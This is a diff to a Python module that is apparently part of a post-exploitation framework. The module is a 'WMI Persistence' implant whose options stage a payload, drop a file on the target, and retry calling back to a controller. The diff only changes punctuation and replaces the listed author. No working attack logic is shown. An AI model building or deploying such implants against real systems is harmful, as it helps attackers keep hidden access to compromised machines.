@@ -89,7 +89,7 @@ class WMIPersistJob(core.job.Job):
         handler.reply(200)
 
     def done(self):
-        self.results = "Completed"
+        self.results = "Completed!"
         self.display()
 
     def display(self):
@@ -99,21 +99,21 @@ class WMIPersistJob(core.job.Job):
 class WMIPersistImplant(core.implant.Implant):
 
     NAME = "WMI Persistence"
-    DESCRIPTION = "Creates persistence using a WMI subscription"
-    AUTHORS = ["TheNaterz"]
+    DESCRIPTION = "Creates persistence using a WMI subscription."
+    AUTHORS = ["Entynetproject"]
     STATE = "implant/persist/wmi"
 
     def load(self):
-        self.options.register("PAYLOAD", "", "payload to stage")
-        self.options.register("CMD", "", "command", hidden=True)
-        self.options.register("CLEANUP", "false", "will remove the created user", enum=["true", "false"])
-        self.options.register("DIRECTORY", "%TEMP%", "writeable directory for output", required=False)
-        self.options.register("LDROPFILE", "data/implant/persist/wmi.dropper", "local file to drop on the target", advanced=True)
-        self.options.register("DROPDIR", "%ALLUSERSPROFILE%", "directory to place the drop file", advanced=True)
+        self.options.register("PAYLOAD", "", "Payload to stage.")
+        self.options.register("CMD", "", "Command.", hidden=True)
+        self.options.register("CLEANUP", "false", "Will remove the created user.", enum=["true", "false"])
+        self.options.register("DIRECTORY", "%TEMP%", "Writeable directory for output.", required=False)
+        self.options.register("LDROPFILE", "data/implant/persist/wmi.dropper", "Local file to drop on the target.", advanced=True)
+        self.options.register("DROPDIR", "%ALLUSERSPROFILE%", "Directory to place the drop file.", advanced=True)
         self.options.register("FDROPDIR", "", "", hidden=True)
-        self.options.register("RETRYATTEMPTS", "5", "number of times to retry calling back before self-terminating (-1 == infinite)")
-        self.options.register("RETRYDELAY", "60", "seconds between retry attempts")
-        self.options.register("DROPFILE", "", "name to give the drop file (randomly generated if no name)", advanced=True)
+        self.options.register("RETRYATTEMPTS", "5", "Number of times to retry calling back before self-terminating (-1 == infinite).")
+        self.options.register("RETRYDELAY", "60", "Seconds between retry attempts.")
+        self.options.register("DROPFILE", "", "Name to give the drop file (randomly generated if no name).", advanced=True)
         self.options.register("FDROPFILE", "", "", hidden=True)
 
     def job(self):
